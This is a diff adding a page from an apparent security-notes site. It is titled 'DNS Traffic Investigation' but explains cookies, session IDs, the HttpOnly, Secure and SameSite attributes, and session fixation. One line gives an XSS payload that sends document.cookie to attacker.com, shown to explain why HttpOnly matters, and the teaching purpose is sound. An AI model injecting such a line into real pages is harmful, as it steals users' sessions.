@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DNS Traffic Investigation</title>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2368362978436357"
+     crossorigin="anonymous"></script>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="topbar">
+
+    <div class="logo">
+        <a href="index.html">BIT+</a>
+    </div>
+
+    <nav>
+        <a href="https://github.com/mu-b003" target="_blank">GitHub</a>
+    </nav>
+
+</header>
+
+<div class="docs-layout">
+
+    <aside class="sidebar">
+
+        <h2>BIT+ Notes</h2>
+
+        <input
+            type="text"
+            id="searchInput"
+            placeholder="Search..."
+        >
+
+          <ul class="menu">
+             <li>
+                <details>
+                    <summary>Network Basics</summary>
+
+                    <ul class="submenu">
+                        <li><a href="network.html">Network</a></li>
+                         <li><a href="osi-Model.html">OSI Model</a></li>
+                        <li><a href="tcp-ip-model.html">TCP/IP model</a></li>
+                         <li><a href="common-Protocols-and-Network Devices.html">Common Protocols & Network Devices</a></li>
+                        <li><a href="domain-Name-System.html">Domain Name System</a></li>
+                        <li><a href="network-Security.html">Network Security</a></li>
+
+                    </ul>
+                </details>
+            </li>
+
+
+            <li>
+                <details>
+                    <summary>Web Security</summary>
+
+                    <ul class="submenu">
+                        <li><a href="http-https.html">HTTP&HTTPS</a></li>
+                        <li><a href="dns.html">DNS</a></li>
+                        <li><a href="cookies-Sessions.html">Cookies & Sessions</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+            <li>
+                <details>
+                    <summary>Linux</summary>
+
+                    <ul class="submenu">
+                        <li><a href="linux-basics.html">Linux Basics</a></li>
+                        <li><a href="permissions.html">Permissions</a></li>
+                        <li><a href="privilege-escalation.html">Privilege Escalation</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+              <hr>
+            <h3>SOC Analyzer Notes</h3>
+
+            <li>
+                <details>
+                    <summary>Home Lab SOC Lab Setup</summary>
+
+                    <ul class="submenu">
+                        <li><a href="soc-lab-setup.html">VMware Setup</a></li>
+                        <li><a href="kali-linux-attacker.html">Kali Linux Attacker Machin</a></li>
+                        <li><a href="ubuntu-setup.html">Ubuntu Desktop Victim</a></li>
+                        <li><a href="windows-10-Setup.html">Windows 10 Setup</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+              <li>
+                <details>
+                    <summary>Logs Analysts</summary>
+
+                    <ul class="submenu">
+                        <li><a href="login-failuer-analyzer.html">Login Failuer Analyzer</a></li>
+                        <li><a href="ssh-brute-force-log-analysis.html">SSH Brute Force Log Analysis</a></li>
+                         <li><a href="ssh-authentication-log-analysis.html">SSH Authentication Log Analysis</a></li>
+                        <li><a href="failed-vs-successful-login-analysis.html">Failed vs Successful Login Analysis</a></li>
+                        <li><a href="suspicious-ip-detection.html">Suspicious IP Detection</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+            <li>
+                <details>
+                    <summary>Security investigation</summary>
+
+                    <ul class="submenu">
+                        <li><a href="incident-response-case-study.html">Incident Response Case Study</a></li>
+                         <li><a href="unauthorized-user-investigation.html">Unauthorized User Investigation</a></li>
+                         <li><a href="liunx-uthentcation-log-investigation.html">Liunx Uthentcation log Investigation</a></li>
+                          <li><a href="privilege-escalation-investigation.html">Privilege Escalation Investigation</a></li>
+                          <li><a href="web-server-attack-investigation.html">Web Server Attack Investigation</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+             <li>
+                <details>
+                    <summary>SOC Networks</summary>
+
+                    <ul class="submenu">
+                        <li><a href="network-Traffic-Analysis-with-Wireshark.html">Network Traffic Analysis with Wireshark</a></li>
+                        <li><a href="port-Scan-Detection.html">Port Scan Detection</a></li>
+                         <li><a href="nmap-Activity-Detection.html">Nmap Activity Detection</a></li>
+                         <li><a href="dns-Traffic-Investigation.html">DNS Traffic Investigation</a></li>
+                        <li><a href="dns-Traffic-Investigation.html">DNS Traffic Investigation</a></li>
+                        <li><a href="suspicious-Connections-Analysis.html">Suspicious Connections Analysis</a></li>
+                    </ul>
+
+                </details>
+            </li>
+
+
+        </ul>
+
+    </aside>
+<main class="content">
+<div class="content-wrapper">
+<h3>Cookies & Sessions</h3>
+<h3>How do Sessions work?</h3>
+<p>1-Log in → The server verifies your information</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785585712/27_wfijfv.png" class="hero-image">
+<p>2-The server creates a unique Session ID and stores it in its memory.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785585915/28_eof329.png" class="hero-image">
+<P>3-It will be sent to you via your browserSet-Cookie</P>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785586168/29_ou3ty0.png" class="hero-image">
+<P>4-Each time you request something, you send this cookie, and the server recognizes you from it without you having to log in again.</P>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785586412/30_nqkoat.png" class="hero-image">
+<hr>
+<h3>Important security characteristics of cookies:</h3>
+<p>HttpOnly— Prevents JavaScript from reading the cookie. If this feature is missing and there is XSS on the site, an attacker can steal the cookie with a single line of code:</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785599965/31_tntekw.png" class="hero-image">
+<p>document.location='http://attacker.com/steal?c='+document.cookie</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785600208/32_bczywo.png" class="hero-image">
+<p>SecureCookies are only sent via HTTPS. If they are lost, they can be stolen via a MITM attack on a public Wi-Fi network.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785600446/33_kwqbra.png" class="hero-image">
+<p>If the Secure attribute is missing, the browser may send the cookie over an HTTP connection. An attacker on the same public Wi-Fi network could intercept the unencrypted traffic using a Man-in-the-Middle (MITM) attack and steal the session cookie.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785600568/34_bvvms3.png" class="hero-image">
+<p>SameSite— Control whether the cookie is sent with requests from other websites (protects against CSRF):</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785600754/35_ato2vm.png" class="hero-image">
+<p>-StrictNever send cross-site requests</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785600938/36_w8sznn.png" class="hero-image">
+<p>-Lax= It is only sent in certain cases (e.g., when shared via links)</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785601079/37_al0xc7.png" class="hero-image">
+<p>-NoneIt always sends (danger if it doesn't have Secure with it)</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785601296/38_d3tguq.png" class="hero-image">
+<h3>Common problems that can be detected through testing:</h3>
+<p>Session Fixation : If the site does not change the Session ID after logging in, you can give the victim a link with a ready-made Session ID, and then when they log in, you will be connected to the same session.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785601470/39_sdjkjn.png" class="hero-image">
+<p>Predictable Session IDs : If the ID increases by one number (1001, 1002, 1003) or is based on weak encryption, you can guess it.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785601592/40_ci8udd.png" class="hero-image">
+<p>Session not ending : If the session does not end after logging out or after a long period of inactivity.</p>
+<img src="https://res.cloudinary.com/dlrvcieqk/image/upload/v1785601763/41_bp3ehu.png" class="hero-image">
+</div>
+</main>
+</div>
+<div class="ad-sidebar">
+    <div class="ad-box">
+
+<footer>
+    <p>
+        BIT+ Platform | &copy; 2026 All rights reserved. 
+        <a href="about-us.html">About Us</a> | 
+        <a href="privacy-policy.html">Privacy Policy</a> | 
+        <a href="contact.html">Contact Us</a>
+    </p>
+</footer>
+
+<script>
+
+const searchInput = document.getElementById("searchInput");
+
+searchInput.addEventListener("keyup", function(){
+
+    let value = this.value.toLowerCase();
+
+    document.querySelectorAll(".menu li").forEach(item => {
+
+        let text = item.textContent.toLowerCase();
+
+        item.style.display =
+            text.includes(value)
+            ? "block"
+            : "none";
+
+    });
+
+});
+
+// 1. اختيار كل الصور التي تحمل الكلاس
+const images = document.querySelectorAll('.hero-image');
+
+// 2. تطبيق حدث الضغط على كل صورة على حدة
+images.forEach(image => {
+  image.addEventListener('click', function() {
+    // 3. إزالة الكلاس expanded من أي صور أخرى إذا كانت مفتوحة (اختياري)
+    images.forEach(img => {
+      if (img !== this) img.classList.remove('expanded');
+    });
+    
+    // 4. تفعيل أو إلغاء التأثير للصورة المضغوطة
+    this.classList.toggle('expanded');
+  });
+});
+</script>
+<style>
+.right-sidebar-ad{
+    position: fixed;
+    top: 90px;
+    right: 20px;
+
+    width: 16vw;
+    min-width: 200px;
+    max-width: 250px;
+
+    min-height: 600px;
+
+    background: #fff;
+    border: 1px solid #e5e7eb;
+    border-radius: 1px;
+    padding: 10px;
+    z-index: 999;
+}
+/* شاشات كبيرة (24-27 بوصة) */
+@media (min-width: 1600px){
+    .right-sidebar-ad{
+        width: 320px;
+    }
+}
+
+/* اللابتوبات */
+@media (min-width: 1101px) and (max-width: 1599px){
+    .right-sidebar-ad{
+        width: 250px;
+        right: 15px;
+    }
+}
+
+/* الأجهزة اللوحية والهواتف */
+@media (max-width: 1100px){
+    .right-sidebar-ad{
+        display: none;
+    }
+}
+</style>
+
+<script async src="https://kibibe.com/pw/waWQiOjEyMzIxODgsInNpZCI6MTc5NTIzMSwid2lkIjo3NDQ2NTQsInNyYyI6Mn0=eyJ.js"></script>
+</body>
+</html>
